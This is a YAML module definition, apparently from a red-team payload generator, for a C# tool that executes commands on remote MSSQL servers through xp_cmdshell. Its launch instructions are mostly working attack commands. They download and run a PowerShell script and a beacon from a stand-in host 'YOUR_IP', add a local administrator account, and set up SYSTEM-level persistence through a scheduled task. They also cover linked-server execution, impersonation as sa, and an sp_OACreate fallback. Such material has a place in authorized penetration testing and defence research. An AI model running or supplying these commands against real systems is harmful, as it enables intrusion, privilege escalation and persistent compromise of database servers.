meta:
  name: "MSSQL Command Execution (C#)"
  category: "Lateral Movement"
  description: |
    Execute commands on remote MSSQL servers via xp_cmdshell.
    
    Features:
    - Integrated Windows authentication
    - Automatic xp_cmdshell enablement
    - Remote command execution
    - Automatic cleanup (disables xp_cmdshell after use)
    - Sysadmin privilege check
    
    This tool connects to MSSQL servers using current Windows credentials,
    enables xp_cmdshell if disabled, executes arbitrary commands, and
    cleans up by disabling xp_cmdshell afterwards.
    
    WARNING: For authorized security testing only!

  effectiveness: "medium"

  mitre:
    tactic: "TA0008 - Lateral Movement"
    technique: "T1210 - Exploitation of Remote Services"

  artifacts:
    - "MSSQL connection logs (Windows authentication)"
    - "sp_configure changes (xp_cmdshell enabled/disabled)"
    - "xp_cmdshell execution in SQL Server logs"
    - "Command execution as SQL Server service account"
    - "Network traffic to MSSQL port 1433"

parameters:
  - name: "mssql_server"
    type: "string"
    description: "MSSQL server hostname or IP address"
    required: true
    default: "sql01.domain.local"

  - name: "output_file"
    type: "string"
    description: "Output executable filename"
    required: false
    default: "mssql.exe"

  - name: "output_path"
    type: "path"
    description: "Output directory for generated payload"
    required: false
    default: "{config.output_dir}"

preprocessing: []

output:
  type: "template"
  template: "lateral_movement/mssql_exec.cs"
  compile:
    enabled: true
    command: "mcs -out:{{ output_path }}/{{ output_file }} -platform:x64 -r:System.Data.dll {{ source_file }}"
  launch_instructions: |
    C# MSSQL Command Execution - Launch Instructions

    Prerequisites:

    - Valid Windows domain credentials with access to MSSQL server
    - Sysadmin role on target MSSQL server (or db_owner + elevated permissions)
    - Network access to MSSQL port (default 1433)
    - .NET Framework on execution machine

    Step 1: Enumerate MSSQL Servers

    Find MSSQL servers in the domain:

    PowerShell:
    Get-SQLInstanceDomain

    Or using PowerUpSQL:
    Import-Module PowerUpSQL
    Get-SQLInstanceBroadcast
    Get-SQLInstanceScanUDP

    Or manual port scan:
    nmap -p 1433 --open 192.168.1.0/24

    Step 2: Execute Commands

    Basic command execution:
    {{ output_file }} {{ mssql_server }} "whoami"

    Check current user:
    {{ output_file }} {{ mssql_server }} "whoami /all"

    List directory:
    {{ output_file }} {{ mssql_server }} "dir C:\\Users"

    Download and execute payload:
    {{ output_file }} {{ mssql_server }} "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')"

    Add local admin:
    {{ output_file }} {{ mssql_server }} "net user hacker P@ssw0rd /add && net localgroup administrators hacker /add"

    Step 3: Establish Persistence

    Create scheduled task:
    {{ output_file }} {{ mssql_server }} "schtasks /create /tn Update /tr C:\\Windows\\Temp\\beacon.exe /sc onlogon /ru SYSTEM"

    Or download and execute beacon:
    {{ output_file }} {{ mssql_server }} "certutil -urlcache -f http://YOUR_IP/beacon.exe C:\\Windows\\Temp\\beacon.exe && C:\\Windows\\Temp\\beacon.exe"

    Notes:

    - Uses Integrated Windows Authentication (current user context)
    - Commands execute as SQL Server service account (often NT SERVICE\\MSSQLSERVER or domain account)
    - Automatically enables xp_cmdshell if disabled
    - Cleans up by disabling xp_cmdshell after execution
    - Requires sysadmin role on target MSSQL server
    - Tool shows sysadmin status before executing

    Common SQL Server Service Accounts:

    - NT SERVICE\\MSSQLSERVER (local system)
    - NT AUTHORITY\\NETWORK SERVICE
    - domain\\sql_svc (domain service account - often over-privileged)

    Advanced Techniques:

    Linked server enumeration:
    SELECT * FROM sys.servers WHERE is_linked = 1

    Execute on linked server:
    EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER]

    Impersonation:
    EXECUTE AS LOGIN = 'sa'

    Troubleshooting:

    - Access Denied: Check SQL Server permissions (need sysadmin or db_owner + CONTROL SERVER)
    - Connection fails: Verify port 1433 is open, SQL Server allows remote connections
    - xp_cmdshell disabled and can't enable: Not sysadmin or explicitly denied
    - No output: Command may have failed or no stdout (try writing to file)

    Alternative Execution Methods:

    Using sp_OACreate (if xp_cmdshell blocked):
    DECLARE @output INT
    EXEC sp_OACreate 'wscript.shell', @output OUTPUT
    EXEC sp_OAMethod @output, 'run', NULL, 'cmd.exe /c whoami > C:\\temp\\out.txt'

    Cleanup:

    Remove executable:
    Remove-Item {{ output_file }} -Force
